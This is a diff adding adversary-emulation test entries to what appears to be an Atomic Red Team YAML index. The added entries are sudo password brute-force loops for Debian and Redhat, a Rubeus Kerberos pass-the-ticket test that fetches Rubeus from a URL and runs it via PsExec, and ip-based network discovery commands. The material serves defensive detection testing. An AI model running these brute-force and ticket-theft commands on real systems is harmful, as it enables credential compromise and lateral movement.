@@ -5171,6 +5171,92 @@ credential-access:
             }
           }
           Write-Host "End of bruteforce"
+    - name: SUDO brute force Debian
+      auto_generated_guid: 464b63e8-bf1f-422e-9e2c-2aa5080b6f9a
+      description: "Brute force the password of a local user account which is a member
+        of the sudo'ers group on a Debian based Linux distribution.  \n"
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'Check if running on a Debian based machine.
+
+'
+        prereq_command: |
+          if grep -iq "debian\|ubuntu\|kali" /usr/lib/os-release; then echo "Debian"; else echo "NOT Debian"; exit 1; fi
+          if grep -Rq "pam_tally" /etc/pam.d/*; then echo "pam_tally configured"; exit 1; fi
+          if [ -x "$(command -v sudo)" ]; then echo "sudo installed"; else echo "install sudo"; fi
+          if [ -x "$(command -v openssl)" ]; then echo "openssl installed"; else echo "install openssl"; fi
+        get_prereq_command: 'apt-get update && apt-get install -y openssl sudo
+
+'
+      executor:
+        elevation_required: true
+        command: |
+          useradd -G sudo -s /bin/bash -p $(openssl passwd -1 password) target
+          su target
+
+          PASSWORDS=(one two three password five); \
+              touch /tmp/file; \
+              for P in ${PASSWORDS[@]}; do \
+                  date +"%b %d %T"; \
+                  sudo -k && echo "$P" |sudo -S whoami &>/tmp/file; \
+                  echo "exit: $?"; \
+                  if grep -q "root" /tmp/file; then \
+                      echo "FOUND: sudo => $P"; break; \
+                  else \
+                      echo "TRIED: $P"; \
+                  fi; \
+                  sleep 2; \
+              done; \
+              rm /tmp/file
+        cleanup_command: 'userdel target
+
+'
+        name: sh
+    - name: SUDO brute force Redhat
+      auto_generated_guid: b72958a7-53e3-4809-9ee1-58f6ecd99ade
+      description: "Brute force the password of a local user account which is a member
+        of the sudo'ers group on a Redhat based Linux distribution.  \n"
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'Check if running on a Redhat based machine.
+
+'
+        prereq_command: |
+          if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then echo "Redhat"; else echo "NOT Redhat"; exit 1; fi
+          if grep -Rq "pam_faillock" /etc/pam.d/*; then echo "pam_faillock configured"; exit 1; fi
+          if [ -x "$(command -v sudo)" ]; then echo "sudo installed"; else echo "install sudo"; fi
+          if [ -x "$(command -v openssl)" ]; then echo "openssl installed"; else echo "install openssl"; fi
+        get_prereq_command: 'yum -y update && yum install -y openssl sudo
+
+'
+      executor:
+        elevation_required: true
+        command: |
+          useradd -G wheel -s /bin/bash -p $(openssl passwd -1 password) target
+          su target
+
+          PASSWORDS=(one two three password five); \
+              touch /tmp/file; \
+              for P in ${PASSWORDS[@]}; do \
+                  date +"%b %d %T"; \
+                  sudo -k && echo "$P" |sudo -S whoami &>/tmp/file; \
+                  echo "exit: $?"; \
+                  if grep -q "root" /tmp/file; then \
+                      echo "FOUND: sudo => $P"; break; \
+                  else \
+                      echo "TRIED: $P"; \
+                  fi; \
+                  sleep 2; \
+              done; \
+              rm /tmp/file
+        cleanup_command: 'userdel target
+
+'
+        name: sh
   T1555.005:
     technique:
       external_references:
@@ -32972,6 +33058,74 @@ defense-evasion:
 
 '
         name: command_prompt
+    - name: Rubeus Kerberos Pass The Ticket
+      auto_generated_guid: a2fc4ec5-12c6-4fb4-b661-961f23f359cb
+      description: |
+        Requesting a TGT on a remote system and retrieving it locally before requesting a service ticket with it. This is a Pass-The-Ticket attack because the TGT is obtained on the remote system, then used from a different machine (local).
+        PsExec is used to execute commands on the remote system, and the "C$" admin share is used to retrieve the TGT, so the current user must have admin rights remotely and other PsExec prerequisites must be met.
+      supported_platforms:
+      - windows
+      input_arguments:
+        target:
+          description: Remote system to request the TGT from
+          type: string
+          default: localhost
+        user_name:
+          description: username associated with the ticket (privileged account not
+            required)
+          type: String
+          default: Administrator
+        password:
+          description: password for user_name
+          type: String
+          default: Password
+        domain:
+          description: domain
+          type: String
+          default: "$Env:USERDOMAIN"
+        rubeus_path:
+          description: Path of the Rubeus binary
+          type: Path
+          default: "$Env:TEMP\\rubeus.exe"
+        rubeus_url:
+          description: URL of Rubeus executable
+          type: Url
+          default: https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe
+        psexec_path:
+          description: Path of the PsExec binary
+          type: String
+          default: C:\PSTools\PsExec.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Rubeus must exist on disk at specified location (#{rubeus_path})
+
+'
+        prereq_command: 'if (Test-Path #{rubeus_path}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Invoke-Webrequest -Uri #{rubeus_url} -OutFile #{rubeus_path}
+
+'
+      - description: 'PsExec must exist on disk at specified location (#{psexec_path})
+
+'
+        prereq_command: 'if (Test-Path #{psexec_path}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
+          Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PsTools.zip"
+          Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
+          New-Item -ItemType Directory (Split-Path "#{psexec_path}") -Force | Out-Null
+          Copy-Item $env:TEMP\PsTools\PsExec.exe "#{psexec_path}" -Force
+      executor:
+        name: powershell
+        elevation_required: true
+        command: "#{psexec_path} -accepteula \\\\#{target} -w c:\\ -c #{rubeus_path}
+          asktgt /user:#{user_name} /password:#{password} /domain:#{domain} /outfile:ticket.kirbi\nSet-Location
+          $env:TEMP\nMove-Item -Force \"\\\\#{target}\\c$\\ticket.kirbi\" ticket.kirbi\nWrite-Host
+          \"Successfully retrieved TGT from '#{target}', now requesting a TGS from
+          local\"\n& \"#{rubeus_path}\" asktgs /service:cifs/#{target} /ticket:ticket.kirbi
+          /ptt\nRemove-Item $env:TEMP\\ticket.kirbi\n& \"#{rubeus_path}\" purge      \n"
   T1556.002:
     technique:
       external_references:
@@ -56029,6 +56183,72 @@ discovery:
       executor:
         command: "#{adfind_path} -sc dclist\n"
         name: command_prompt
+    - name: Remote System Discovery - ip neighbour
+      auto_generated_guid: 158bd4dd-6359-40ab-b13c-285b9ef6fa25
+      description: "Use the ip neighbour command to display the known link layer (ARP
+        table) addresses for hosts sharing the same network segment. \n"
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'Check if ip command exists on the machine
+
+'
+        prereq_command: 'if [ -x "$(command -v ip)" ]; then exit 0; else exit 1; fi;
+
+'
+        get_prereq_command: 'apt-get install iproute2 -y
+
+'
+      executor:
+        command: 'ip neighbour show
+
+'
+        name: sh
+    - name: Remote System Discovery - ip route
+      auto_generated_guid: 1a4ebe70-31d0-417b-ade2-ef4cb3e7d0e1
+      description: "Use the ip route command to display the kernels routing tables.
+        \n"
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'Check if ip command exists on the machine
+
+'
+        prereq_command: 'if [ -x "$(command -v ip)" ]; then exit 0; else exit 1; fi;
+
+'
+        get_prereq_command: 'apt-get install iproute2 -y
+
+'
+      executor:
+        command: 'ip route show
+
+'
+        name: sh
+    - name: Remote System Discovery - ip tcp_metrics
+      auto_generated_guid: 6c2da894-0b57-43cb-87af-46ea3b501388
+      description: "Use the ip tcp_metrics command to display the recent cached entries
+        for IPv4 and IPv6 source and destination addresses. \n"
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'Check if ip command exists on the machine
+
+'
+        prereq_command: 'if [ -x "$(command -v ip)" ]; then exit 0; else exit 1; fi;
+
+'
+        get_prereq_command: 'apt-get install iproute2 -y
+
+'
+      executor:
+        command: 'ip tcp_metrics show |grep --invert-match "^127\."
+
+'
+        name: sh
   T1518.001:
     technique:
       id: attack-pattern--cba37adb-d6fb-4610-b069-dd04c0643384
@@ -66249,6 +66469,74 @@ lateral-movement:
 
 '
         name: command_prompt
+    - name: Rubeus Kerberos Pass The Ticket
+      auto_generated_guid: a2fc4ec5-12c6-4fb4-b661-961f23f359cb
+      description: |
+        Requesting a TGT on a remote system and retrieving it locally before requesting a service ticket with it. This is a Pass-The-Ticket attack because the TGT is obtained on the remote system, then used from a different machine (local).
+        PsExec is used to execute commands on the remote system, and the "C$" admin share is used to retrieve the TGT, so the current user must have admin rights remotely and other PsExec prerequisites must be met.
+      supported_platforms:
+      - windows
+      input_arguments:
+        target:
+          description: Remote system to request the TGT from
+          type: string
+          default: localhost
+        user_name:
+          description: username associated with the ticket (privileged account not
+            required)
+          type: String
+          default: Administrator
+        password:
+          description: password for user_name
+          type: String
+          default: Password
+        domain:
+          description: domain
+          type: String
+          default: "$Env:USERDOMAIN"
+        rubeus_path:
+          description: Path of the Rubeus binary
+          type: Path
+          default: "$Env:TEMP\\rubeus.exe"
+        rubeus_url:
+          description: URL of Rubeus executable
+          type: Url
+          default: https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe
+        psexec_path:
+          description: Path of the PsExec binary
+          type: String
+          default: C:\PSTools\PsExec.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Rubeus must exist on disk at specified location (#{rubeus_path})
+
+'
+        prereq_command: 'if (Test-Path #{rubeus_path}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Invoke-Webrequest -Uri #{rubeus_url} -OutFile #{rubeus_path}
+
+'
+      - description: 'PsExec must exist on disk at specified location (#{psexec_path})
+
+'
+        prereq_command: 'if (Test-Path #{psexec_path}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
+          Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PsTools.zip"
+          Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
+          New-Item -ItemType Directory (Split-Path "#{psexec_path}") -Force | Out-Null
+          Copy-Item $env:TEMP\PsTools\PsExec.exe "#{psexec_path}" -Force
+      executor:
+        name: powershell
+        elevation_required: true
+        command: "#{psexec_path} -accepteula \\\\#{target} -w c:\\ -c #{rubeus_path}
+          asktgt /user:#{user_name} /password:#{password} /domain:#{domain} /outfile:ticket.kirbi\nSet-Location
+          $env:TEMP\nMove-Item -Force \"\\\\#{target}\\c$\\ticket.kirbi\" ticket.kirbi\nWrite-Host
+          \"Successfully retrieved TGT from '#{target}', now requesting a TGS from
+          local\"\n& \"#{rubeus_path}\" asktgs /service:cifs/#{target} /ticket:ticket.kirbi
+          /ptt\nRemove-Item $env:TEMP\\ticket.kirbi\n& \"#{rubeus_path}\" purge      \n"
   T1563.002:
     technique:
       external_references:
